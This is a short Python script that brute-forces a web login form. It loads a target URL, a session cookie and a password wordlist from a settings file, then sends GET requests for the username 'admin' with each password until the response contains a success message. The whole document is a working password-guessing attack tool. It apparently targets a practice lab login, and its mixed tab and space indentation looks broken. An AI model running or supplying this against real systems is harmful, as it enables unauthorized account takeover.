import requests
import json
from bs4 import BeautifulSoup as Soup

def check(html):
    return Soup(html, features="lxml").findAll(text=success_message)

settings = json.loads(open("settings.json").read())
cookie = settings["cookie"]
success_message = settings["success_message"]
filename = settings["file_pass"]
url = settings["url"]

with open(filename) as f:
    print('Starting brute force...')
    for password in f:
        payload = {'username': 'admin', 'password': password.rstrip('\r\n'), 'Login': 'Login'}
	response = requests.Session().get(url, cookies=cookie, params=payload).text
        success = check(response)
        if success:
            print('Password: ' + password)
            break
            
    if not success:
        print('Brute force failed')